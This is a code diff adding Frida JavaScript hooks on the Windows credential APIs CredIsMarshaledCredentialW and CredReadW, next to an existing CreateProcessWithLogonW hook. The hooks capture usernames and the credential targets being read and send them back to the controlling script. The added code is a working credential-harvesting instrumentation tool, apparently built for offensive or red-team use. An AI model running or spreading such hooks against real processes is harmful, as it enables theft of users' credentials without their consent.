@@ -2,6 +2,71 @@
 
 var pCreateProcessWithLogonW = Module.findExportByName("Advapi32.dll", 'CreateProcessWithLogonW')
 
+var pCredIsMarshaledCredentialW = Module.findExportByName("Advapi32.dll", 'CredIsMarshaledCredentialW')
+
+var pCredReadW = Module.findExportByName("Advapi32.dll", 'CredReadW')
+
+Interceptor.attach(pCredIsMarshaledCredentialW, {
+    onEnter: function (args) {
+        send(JSON.stringify({
+            type: "log",
+            from: "CredIsMarshaledCredentialW",
+            data: {
+                text: "CredIsMarshaledCredentialW API hooked!",
+                type: "INFO"
+            }
+        }));
+        // Save the following arguments for OnLeave
+        this.lpUsername = args[0];
+    },
+    onLeave: function (args) {
+        send(JSON.stringify({
+            type: "log",
+            from: "CredIsMarshaledCredentialW",
+            data: {
+                text: "Retrieving argument values..",
+                type: "INFO"
+            }
+        }));
+        send(JSON.stringify({
+            type: "data",
+            from: "CredIsMarshaledCredentialW",
+            data: {
+                credentials: {
+                    Domain: "",
+                    Username: this.lpUsername.readUtf16String(),
+                    Password: ""
+                }
+            }
+        }));
+    }
+});
+
+Interceptor.attach(pCredReadW, {
+    onEnter: function (args) {
+        send(JSON.stringify({
+            type: "log",
+            from: "CredReadW",
+            data: {
+                text: "CredReadW API hooked!",
+                type: "INFO"
+            }
+        }));
+        // Save the following arguments for OnLeave
+        this.TargetName = args[0];
+    },
+    onLeave: function (args) {
+        send(JSON.stringify({
+            type: "log",
+            from: "CredReadW",
+            data: {
+                text: "User tries to access " + this.TargetName.readUtf16String(),
+                type: "INFO"
+            }
+        }));
+    }
+});
+
 Interceptor.attach(pCreateProcessWithLogonW, {
     onEnter: function (args) {
         send(JSON.stringify({
